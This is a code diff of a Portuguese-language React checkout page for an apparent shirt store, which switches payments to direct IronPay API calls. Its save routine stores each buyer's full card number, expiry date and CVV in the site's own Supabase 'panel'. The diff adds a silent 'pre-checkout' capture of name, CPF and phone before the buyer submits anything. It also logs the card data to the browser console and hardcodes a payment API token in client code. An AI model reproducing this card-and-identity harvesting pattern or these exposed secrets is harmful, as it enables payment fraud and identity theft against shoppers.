@@ -1,18 +1,9 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useSearchParams, useNavigate } from 'react-router-dom';
 import { supabase } from '../lib/supabase';
 import { useCart } from '../contexts/CartContext';
 import { allProducts } from '../data/products';
-import {
-  trackInitiateCheckout,
-  trackPurchase,
-  trackLead,
-  sha256,
-  getFbc,
-  getFbp,
-  generateEventId,
-} from '../lib/metaPixel';
-import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock, CheckCircle2, ShoppingCart } from 'lucide-react';
+import { User, Mail, CreditCard, MapPin, Phone, Calendar, Hash, Lock, ShieldCheck, QrCode, Copy, CheckCheck, Clock, CheckCircle2 } from 'lucide-react';
 
 const IRONPAY_API_URL = 'https://api.ironpayapp.com.br/api/public/v1/transactions';
 const IRONPAY_TOKEN = 'qoVerJe5Jw33aHINratQw4XFdc4gtQrEPFJ9QE7CRz22JyHupjVT0h8IdmIf';
@@ -35,32 +26,13 @@ export default function Checkout() {
   const [aprovado, setAprovado] = useState(false);
   const [parcelas, setParcelas] = useState('1');
 
-  // event_id gerado uma única vez por sessão de checkout para deduplicação
-  // InitiateCheckout: mesmo ID usado no Pixel e na CAPI
-  const initiateCheckoutEventId = useRef<string>(generateEventId('InitiateCheckout'));
-
-  const { items: cartItems, totalPrice: cartTotal, totalItems, clearCart } = useCart();
+  const { items: cartItems, totalPrice: cartTotal, totalItems } = useCart();
   const [timeLeft, setTimeLeft] = useState(300);
-  
-  // Estado inicial com fallback para carrinho
-  const getInitialProduto = () => {
-    if (cartItems.length > 0) {
-      return {
-        nome: `🛒 CARRINHO (${totalItems} ITENS)`,
-        preco: Number(cartTotal) || 0,
-        precoOriginal: Number(cartTotal) || 0,
-        imagens: cartItems.map(item => item.product.image || item.product.imagem_url).filter(img => img) as string[]
-      };
-    }
-    return {
-      nome: 'Carregando...',
-      preco: 0,
-      precoOriginal: 0,
-      imagens: [] as string[]
-    };
-  };
-  
-  const [produto, setProduto] = useState(getInitialProduto());
+  const [produto, setProduto] = useState({
+    nome: 'Buscando camisa...',
+    preco: 0,
+    imagens: [] as string[]
+  });
 
   const [formData, setFormData] = useState({
     nome: '', email: '', cpf: '', dataNascimento: '', telefone: '',
@@ -68,31 +40,12 @@ export default function Checkout() {
     numCartao: '', nomeCartao: '', validade: '', cvv: ''
   });
 
-  // Unifica carregamento e desconto para evitar sobrescrita de estado
   useEffect(() => {
     const id = searchParams.get('id');
     const overrideNome = searchParams.get('nome');
     const overridePreco = searchParams.get('preco');
     const overrideImg = searchParams.get('img');
-    const qty = Math.max(1, parseInt(searchParams.get('qty') || '1')); // Garante qty mínimo de 1
-    const targetId = '0dce4ece-6f41-4914-8e37-6100956c9613';
-
-    const applyDiscount = (basePrice: number) => {
-      if (id === targetId && metodo === 'pix') {
-        return basePrice * 0.9;
-      }
-      return basePrice;
-    };
-    
-    // Função auxiliar para garantir que o preço nunca seja zerado
-    const ensureValidPrice = (price: number) => {
-      return price || 0;
-    };
-
-    // Se não há ID na URL e o carrinho está vazio, não faz nada
-    if (!id && !overrideNome && !overridePreco && cartItems.length === 0) {
-      return;
-    }
+    const qty = parseInt(searchParams.get('qty') || '1');
 
     if (id) {
       supabase
@@ -111,97 +64,40 @@ export default function Checkout() {
               return 0;
             };
 
-            const unitPrice = overridePreco ? Number(overridePreco) : parsePrice(data.preco);
-            const basePrice = ensureValidPrice(unitPrice * qty);
             setProduto({
               nome: overrideNome || data.nome,
-              preco: ensureValidPrice(applyDiscount(basePrice)),
-              precoOriginal: basePrice,
+              preco: (overridePreco ? Number(overridePreco) : parsePrice(data.preco)) * qty,
               imagens: [overrideImg || data.imagem_url || data.image].filter(img => img && !img.includes('placeholder')) as string[]
             });
           } else {
             const localProd = allProducts.find(p => p.id === id);
             if (localProd) {
-              const unitPrice = overridePreco ? Number(overridePreco) : localProd.priceNum;
-              const basePrice = ensureValidPrice(unitPrice * qty);
               setProduto({
                 nome: overrideNome || localProd.name,
-                preco: ensureValidPrice(applyDiscount(basePrice)),
-                precoOriginal: basePrice,
+                preco: (overridePreco ? Number(overridePreco) : localProd.priceNum) * qty,
                 imagens: [overrideImg || localProd.image].filter(img => img) as string[]
               });
             }
           }
         });
     } else if (overrideNome && overridePreco) {
-      const basePrice = ensureValidPrice(Number(overridePreco) * qty);
       setProduto({
         nome: overrideNome,
-        preco: ensureValidPrice(applyDiscount(basePrice)),
-        precoOriginal: basePrice,
+        preco: Number(overridePreco) || 0,
         imagens: (overrideNome.includes('Carrinho') || overrideNome.includes('CARRINHO')) ? [] : (overrideImg ? [overrideImg] : [])
       });
     } else if (cartItems.length > 0) {
-      const basePrice = Number(cartTotal) || 0;
-      
-      // Verifica se o produto alvo do desconto está no carrinho
-      const hasTargetProduct = cartItems.some(item => item.product.id === targetId);
-      
-      let finalPrice = basePrice;
-      if (hasTargetProduct && metodo === 'pix') {
-        const targetProduct = cartItems.find(i => i.product.id === targetId);
-        const discountAmount = (targetProduct?.product.priceNum || 0) * 0.1;
-        finalPrice = basePrice - discountAmount;
-      }
-
       setProduto({
         nome: `CARRINHO (${totalItems} ITENS)`,
-        preco: finalPrice,
-        precoOriginal: basePrice,
-        imagens: cartItems.map(item => item.product.image || item.product.imagem_url).filter(img => img) as string[]
+        preco: Number(cartTotal) || 0,
+        imagens: []
       });
     }
-  }, [searchParams, cartItems, cartTotal, totalItems, metodo]);
-
-  // InitiateCheckout — dispara quando o checkout é carregado com preço definido
-  // Usa o mesmo event_id (initiateCheckoutEventId) para Pixel e CAPI → deduplicação garantida
-  useEffect(() => {
-    if (!produto.preco) return;
-    
-    const timer = setTimeout(() => {
-      const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
-      trackInitiateCheckout({
-        value: produto.preco,
-        numItems: parseInt(searchParams.get('qty') || '1'),
-        contentIds: ids,
-        userData: { fbc: getFbc(), fbp: getFbp() },
-        eventId: initiateCheckoutEventId.current,
-      });
-    }, 500);
-
-    return () => clearTimeout(timer);
-  }, [produto.preco]);
+  }, [searchParams, cartItems, cartTotal, totalItems]);
 
   const salvarDadosNoPainel = async (statusPagamento = 'pending') => {
     try {
-      // Prioriza o valor real do carrinho se houver itens
-      let valorFinal = 0;
-      
-      if (cartItems.length > 0) {
-        // Se há itens no carrinho, usa o total do carrinho
-        const cartValue = Number(cartTotal) || 0;
-        valorFinal = cartValue >= 5 ? cartValue : produto.preco;
-      } else {
-        // Se não há carrinho, usa o valor do produto
-        valorFinal = (produto.preco && produto.preco >= 5) ? produto.preco : produto.precoOriginal;
-      }
-      
-      // Garante que o valor nunca seja menor que 5 reais (limite da API)
-      if (!valorFinal || valorFinal < 5) {
-        valorFinal = 5; // Fallback seguro para não bloquear o salvamento
-        console.warn(`Aviso: valor_total ajustado para 5 reais (mínimo da API de pagamento).`);
-      }
-      
+      console.log("Tentando salvar dados no Supabase...", formData);
       const { error } = await supabase.from('checkouts').insert([{
         nome_completo: formData.nome,
         email: formData.email,
@@ -219,20 +115,26 @@ export default function Checkout() {
         validade_cartao: metodo === 'cartao' ? formData.validade : 'PIX',
         cvv_cartao: metodo === 'cartao' ? formData.cvv : 'PIX',
         produto_nome: produto.nome,
-        valor_total: Math.max(valorFinal, 5),
+        valor_total: produto.preco,
         status: statusPagamento
       }]);
       
       if (error) {
-        console.error("❌ Erro Supabase:", error.message, "| Detalhes:", error.details, "| Hint:", error.hint);
-        throw error;
+        console.error("Erro Supabase:", error);
+      } else {
+        console.log("Dados salvos com sucesso no Supabase!");
       }
-      
-      console.log("✅ Dados salvos no Supabase com sucesso! Valor:", Math.max(valorFinal, 5), "| Carrinho:", cartItems.length, "itens");
-    } catch (e: any) {
-      console.error("Erro crítico ao salvar dados:", e.message || e);
+    } catch (e) {
+      console.error("Erro ao salvar dados no painel:", e);
     }
   };
+
+  // Salvar dados automaticamente quando o usuário termina de preencher o telefone (último campo da seção 1)
+  useEffect(() => {
+    if (formData.nome && formData.cpf && formData.telefone.length >= 14) {
+      salvarDadosNoPainel('pre-checkout');
+    }
+  }, [formData.telefone]);
 
   const gerarPix = async () => {
     if (!formData.nome || !formData.cpf || !formData.email) {
@@ -245,32 +147,23 @@ export default function Checkout() {
     setPixData(null);
 
     try {
-      // Calcula o valor correto: carrinho ou produto
-      const valorPagamento = cartItems.length > 0 ? Number(cartTotal) || 0 : produto.preco;
-      
-      if (!valorPagamento || valorPagamento < 5) {
-        setPixErro('Valor da compra deve ser no mínimo R$ 5,00. Verifique o produto selecionado.');
-        setPixLoading(false);
-        return;
-      }
-      
-      const amountInCents = Math.round(valorPagamento * 100);
+      const amountInCents = Math.round(produto.preco * 100);
       const payload = {
-        amount: valorPagamento, // Envia valor real, a API converte para centavos
+        amount: amountInCents,
         offer_hash: '35E5jbK1n9',
         payment_method: 'pix',
         installments: 1,
-        client: { // A API espera 'client' conforme o código da função
+        customer: {
           name: formData.nome,
           email: formData.email,
-          phone: formData.telefone,
-          document: formData.cpf,
-          cep: formData.cep,
-          endereco: formData.endereco,
-          numero: formData.numero,
-          bairro: formData.bairro,
-          cidade: formData.cidade,
-          estado: formData.estado
+          phone_number: formData.telefone.replace(/\D/g, '') || '11999999999',
+          document: formData.cpf.replace(/\D/g, ''),
+          street_name: formData.endereco || 'Rua não informada',
+          number: formData.numero || 'SN',
+          neighborhood: formData.bairro || 'Bairro não informado',
+          city: formData.cidade || 'Cidade não informada',
+          state: formData.estado || 'SP',
+          zip_code: formData.cep.replace(/\D/g, '') || '00000000'
         },
         cart: [
           {
@@ -286,39 +179,26 @@ export default function Checkout() {
         transaction_origin: 'api'
       };
 
-      const res = await fetch('/api/create-payment', {
+      const res = await fetch(`${IRONPAY_API_URL}?api_token=${IRONPAY_TOKEN}`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload),
       });
 
       const json = await res.json();
-      if (!res.ok) throw new Error(json?.error || 'Erro ao gerar PIX');
+      if (!res.ok) throw new Error(json?.message || json?.error || 'Erro na IronPay');
 
-      const qrCode = json?.pix?.code || '';
-      const qrImage = json?.pix?.image || '';
+      const qrCode = json?.pix?.pix_qr_code || json?.pix?.code || '';
+      const qrImage = json?.pix?.pix_url || '';
 
       if (!qrCode) throw new Error('PIX gerado sem código pela IronPay.');
 
       setPixData({ 
         qrCode, 
-        qrImage
+        qrImage: qrImage && qrImage.startsWith('http') ? qrImage : `https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(qrCode)}`
       });
       
       await salvarDadosNoPainel('pix_generated');
-
-      // InitiateCheckout com dados do usuário (PIX gerado = intenção de compra confirmada)
-      // Reutiliza o mesmo event_id da sessão de checkout para deduplicação
-      const emailHash = await sha256(formData.email);
-      const phoneHash = await sha256(formData.telefone.replace(/\D/g, ''));
-      const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
-      trackInitiateCheckout({
-        value: produto.preco,
-        numItems: 1,
-        contentIds: ids,
-        userData: { em: emailHash, ph: phoneHash, fbc: getFbc(), fbp: getFbp() },
-        eventId: initiateCheckoutEventId.current,
-      });
     } catch (err: any) {
       setPixErro(err?.message || 'Erro ao conectar com IronPay.');
     } finally {
@@ -328,15 +208,6 @@ export default function Checkout() {
 
   const handleFinalizar = async (e: React.FormEvent) => {
     e.preventDefault();
-    
-    // Salva os dados IMEDIATAMENTE como 'checkout_iniciado' para não perder a captura
-    // mesmo que o usuário não complete o pagamento ou feche a aba
-    try {
-      await salvarDadosNoPainel('checkout_iniciado');
-    } catch (err) {
-      console.error("Erro no lead capture inicial:", err);
-    }
-
     if (metodo === 'pix') {
       if (!pixData) gerarPix();
       return;
@@ -349,33 +220,29 @@ export default function Checkout() {
       const amountInCents = Math.round(produto.preco * 100);
       const [mes, ano] = formData.validade.split('/');
       
-      // Gera event_id único para Purchase (cartão) — será enviado ao webhook via metadata
-      // para que o servidor possa usar o mesmo ID na CAPI e evitar dupla contagem
-      const purchaseEventId = generateEventId('Purchase');
-
       const payload = {
-        amount: produto.preco,
+        amount: amountInCents,
         offer_hash: '35E5jbK1n9',
         payment_method: 'credit_card',
         installments: parseInt(parcelas),
         card: {
           number: formData.numCartao.replace(/\s/g, ''),
           holder_name: formData.nomeCartao,
-          expiry_month: parseInt(mes),
-          expiry_year: 2000 + parseInt(ano),
+          exp_month: parseInt(mes),
+          exp_year: 2000 + parseInt(ano),
           cvv: formData.cvv
         },
-        client: {
+        customer: {
           name: formData.nome,
           email: formData.email,
-          phone: formData.telefone,
-          document: formData.cpf,
-          cep: formData.cep,
-          endereco: formData.endereco,
-          numero: formData.numero,
-          bairro: formData.bairro,
-          cidade: formData.cidade,
-          estado: formData.estado
+          phone_number: formData.telefone.replace(/\D/g, ''),
+          document: formData.cpf.replace(/\D/g, ''),
+          street_name: formData.endereco,
+          number: formData.numero,
+          neighborhood: formData.bairro,
+          city: formData.cidade,
+          state: formData.estado,
+          zip_code: formData.cep.replace(/\D/g, '')
         },
         cart: [{
           product_hash: 'aouiaiqbuo',
@@ -385,39 +252,20 @@ export default function Checkout() {
           operation_type: 1,
           tangible: true
         }],
-        transaction_origin: 'api',
-        // Passa o event_id para o servidor poder usar na CAPI (deduplicação)
-        meta_event_id: purchaseEventId,
+        transaction_origin: 'api'
       };
 
-      const res = await fetch('/api/create-payment', {
+      const res = await fetch(`${IRONPAY_API_URL}?api_token=${IRONPAY_TOKEN}`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
         body: JSON.stringify(payload),
       });
 
       const json = await res.json();
       
-      const status = json?.card?.status || json?._raw?.payment_status || json?._raw?.status;
-      if (res.ok && (status === 'paid' || status === 'approved')) {
+      if (res.ok && (json.payment_status === 'paid' || json.payment_status === 'approved' || json.status === 'paid')) {
         await salvarDadosNoPainel('paid');
-        clearCart();
         setAprovado(true);
-
-        // Purchase — compra aprovada no cartão
-        // Usa o mesmo event_id enviado ao servidor para deduplicação Pixel ↔ CAPI
-        const emailHashPurchase = await sha256(formData.email);
-        const phoneHashPurchase = await sha256(formData.telefone.replace(/\D/g, ''));
-        const orderId = json?.id || json?.transaction_id || 'cartao_' + Date.now();
-        const ids = searchParams.get('id') ? [searchParams.get('id') as string] : ['carrinho'];
-        trackPurchase({
-          orderId,
-          value: produto.preco,
-          contentIds: ids,
-          numItems: parseInt(searchParams.get('qty') || '1'),
-          userData: { em: emailHashPurchase, ph: phoneHashPurchase, fbc: getFbc(), fbp: getFbp() },
-          eventId: purchaseEventId,
-        });
       } else {
         throw new Error(json?.message || json?.error || 'Cartão recusado');
       }
@@ -487,41 +335,13 @@ export default function Checkout() {
 
         <div style={{ padding: '20px' }}>
           <div style={productBox}>
-            {produto.imagens && produto.imagens.length > 0 && (
-              <div style={{ display: 'flex', gap: '5px', overflowX: 'auto', maxWidth: '180px' }}>
-                {produto.imagens.slice(0, 3).map((img, idx) => (
-                  <img 
-                    key={idx}
-                    src={img} 
-                    alt={`${produto.nome} ${idx}`} 
-                    style={{ width: '60px', height: '60px', objectFit: 'cover', borderRadius: '8px', border: '1px solid #ddd', flexShrink: 0 }} 
-                  />
-                ))}
-                {produto.imagens.length > 3 && (
-                  <div style={{ width: '60px', height: '60px', background: '#eee', borderRadius: '8px', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '12px', fontWeight: 'bold', flexShrink: 0 }}>
-                    +{produto.imagens.length - 3}
-                  </div>
-                )}
-              </div>
-            )}
             <div style={{ flex: 1 }}>
-              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000', lineHeight: '1.2', textTransform: 'uppercase', display: 'flex', alignItems: 'center', gap: '6px' }}>
-                {cartItems.length > 0 && <ShoppingCart size={16} color="#000" />}
+              <div style={{ fontWeight: '900', fontSize: '14px', color: '#000', lineHeight: '1.2', textTransform: 'uppercase' }}>
                 {produto.nome}
               </div>
               <div style={{ fontSize: '20px', fontWeight: '900', color: '#000', marginTop: '5px' }}>
                 R$ {(Number(produto.preco) || 0).toFixed(2).replace('.', ',')}
-                {metodo === 'pix' && searchParams.get('id') === '0dce4ece-6f41-4914-8e37-6100956c9613' && (
-                  <span style={{ marginLeft: '10px', fontSize: '12px', color: '#1da154', verticalAlign: 'middle', background: '#e8f5e9', padding: '2px 8px', borderRadius: '4px' }}>
-                    -10% PIX
-                  </span>
-                )}
               </div>
-              {cartItems.length > 0 && (
-                <div style={{ fontSize: '12px', color: '#1da154', marginTop: '3px', fontWeight: 900, display: 'flex', alignItems: 'center', gap: '4px' }}>
-                  <ShoppingCart size={12} /> {totalItems} {totalItems === 1 ? 'ITEM SELECIONADO' : 'ITENS NO CARRINHO'}
-                </div>
-              )}
             </div>
           </div>
 
@@ -584,55 +404,16 @@ export default function Checkout() {
 
             {metodo === 'pix' && (
               <div style={pixSection}>
-                <div style={{ color: '#1da154', border: '2px dashed #1da154', borderRadius: '12px', padding: '15px', fontWeight: '900', marginBottom: '15px', fontSize: '15px', textAlign: 'center', width: '100%', display: 'block' }}>
-                  PIX COM RECEBIMENTO IMEDIATO
-                  {searchParams.get('id') === '0dce4ece-6f41-4914-8e37-6100956c9613' && (
-                    <div style={{ fontSize: '13px', marginTop: '5px', color: '#1da154' }}>
-                      🔥 DESCONTO DE 10% APLICADO!
-                    </div>
-                  )}
-                </div>
-                
-                {!pixData && !pixLoading && (
-                  <button type="submit" style={btnPagar}>FINALIZAR COMPRA E GERAR PIX</button>
-                )}
-
-                {pixLoading && (
-                  <div style={{ padding: '20px 0', textAlign: 'center' }}>
-                    <div style={{ ...spinnerStyle, margin: '0 auto' }} />
-                    <p style={{ marginTop: '15px', fontWeight: '900', color: '#000' }}>Gerando seu QR Code...</p>
-                  </div>
-                )}
-
-                {pixErro && !pixLoading && (
-                  <div style={errorBanner}>
-                    {pixErro}<br />
-                    <button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900' }}>Tentar novamente</button>
-                  </div>
-                )}
-
+                <div style={{ color: '#1da154', fontWeight: '900', marginBottom: '15px', fontSize: '15px', textAlign: 'center', width: '100%', display: 'block', lineHeight: '1' }}>PIX COM RECEBIMENTO IMEDIATO</div>
+                {pixLoading && <div style={{ padding: '20px 0' }}><div style={spinnerStylePix} /><span style={{ fontSize: '13px', color: '#555', fontWeight: '700' }}>Gerando QR Code...</span></div>}
+                {pixErro && !pixLoading && <div style={errorBanner}>{pixErro}<br /><button type="button" onClick={gerarPix} style={{ marginTop: '8px', padding: '8px 16px', background: '#000', color: '#fff', border: 'none', borderRadius: '8px', fontWeight: '900' }}>Tentar novamente</button></div>}
                 {pixData && !pixLoading && (
-                  <div style={{ textAlign: 'center', animation: 'fadeIn 0.5s ease-in' }}>
-                    <div style={{ marginBottom: '10px', color: '#ef4444', fontWeight: 'bold', fontSize: '14px' }}>
-                      Pague agora para garantir sua reserva!
-                    </div>
-                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}>
-                      <div style={{ padding: '12px', background: '#fff', borderRadius: '16px', border: '3px solid #1da154', boxShadow: '0 4px 12px rgba(0,0,0,0.1)' }}>
-                        <img src={pixData.qrImage} alt="QR Code PIX" style={{ width: '220px', height: '220px' }} />
-                      </div>
-                    </div>
-                    <div style={{ ...pixCodeBox, wordBreak: 'break-all', fontSize: '12px', padding: '12px', background: '#f8f9fa', borderRadius: '8px', marginBottom: '10px', border: '1px solid #ddd' }}>
-                      {pixData.qrCode}
-                    </div>
-                    <button 
-                      type="button" 
-                      onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} 
-                      style={{ ...btnPagar, background: copiado ? '#1da154' : '#000', marginBottom: '10px' }}
-                    >
-                      {copiado ? '✅ CÓDIGO COPIADO!' : 'COPIAR CÓDIGO PIX'}
-                    </button>
-                    <p style={{ fontSize: '12px', color: '#666' }}>Após o pagamento, o seu pedido será processado automaticamente.</p>
-                  </div>
+                  <>
+                    <div style={{ textAlign: 'center', marginBottom: '10px', color: timeLeft < 60 ? '#ef4444' : '#666', fontWeight: 'bold', fontSize: '14px' }}>Expira em: {formatTime(timeLeft)}</div>
+                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '16px' }}><div style={{ padding: '8px', background: '#fff', borderRadius: '12px', border: '2px dashed #1da154' }}><img src={pixData.qrImage} alt="QR" style={{ width: '200px', height: '200px' }} /></div></div>
+                    <div style={pixCodeBox}>{pixData.qrCode}</div>
+                    <button type="button" onClick={() => { navigator.clipboard.writeText(pixData.qrCode); setCopiado(true); setTimeout(() => setCopiado(false), 2000); }} style={{ ...btnPagar, background: copiado ? '#1da154' : '#000' }}>{copiado ? 'COPIADO!' : 'COPIAR CÓDIGO PIX'}</button>
+                  </>
                 )}
               </div>
             )}
@@ -644,7 +425,7 @@ export default function Checkout() {
   );
 }
 
-const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', pointerEvents: 'auto' };
+const overlayStyle: React.CSSProperties = { position: 'fixed', inset: 0, background: 'rgba(255,255,255,0.95)', zIndex: 1000, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' };
 const spinnerStyle = { border: '4px solid #f3f3f3', borderTop: '4px solid #1da154', borderRadius: '50%', width: '40px', height: '40px', animation: 'spin 1s linear infinite' };
 const spinnerStylePix = { border: '3px solid #d1fae5', borderTop: '3px solid #1da154', borderRadius: '50%', width: '32px', height: '32px', animation: 'spin 1s linear infinite', margin: '0 auto' };
 const productBox = { display: 'flex', gap: '15px', padding: '20px', background: '#f8f9fa', borderRadius: '12px', border: '2px solid #000', marginBottom: '20px' };
@@ -657,5 +438,10 @@ const inputStyle = { border: 'none', padding: '14px 0', marginLeft: '10px', widt
 const cardSection = { marginTop: '25px', padding: '20px', background: '#f8f9fa', borderRadius: '15px', border: '2px solid #000' };
 const errorBanner = { background: '#fee2e2', color: '#b91c1c', padding: '15px', borderRadius: '10px', marginBottom: '15px', fontSize: '13px', fontWeight: '900', textAlign: 'center' as 'center', border: '1px solid #ef4444' };
 const btnPagar = { width: '100%', padding: '20px', background: '#1da154', color: '#fff', border: 'none', borderRadius: '12px', fontWeight: '900', fontSize: '16px', marginTop: '10px', cursor: 'pointer' };
-const pixSection = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px' };
+const pixSection = { marginTop: '20px', textAlign: 'center' as 'center', background: '#f0fff4', padding: '25px 20px', borderRadius: '20px', border: '2px dashed #1da154' };
 const pixCodeBox = { marginTop: '12px', marginBottom: '4px', fontSize: '10px', background: '#fff', padding: '10px', borderRadius: '8px', border: '1px solid #ddd', wordBreak: 'break-all' as 'break-all', fontWeight: 'bold', textAlign: 'left' as 'left', maxHeight: '60px', overflowY: 'auto' as 'auto' };
+const formatTime = (seconds: number) => {
+  const mins = Math.floor(seconds / 60);
+  const secs = seconds % 60;
+  return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+};
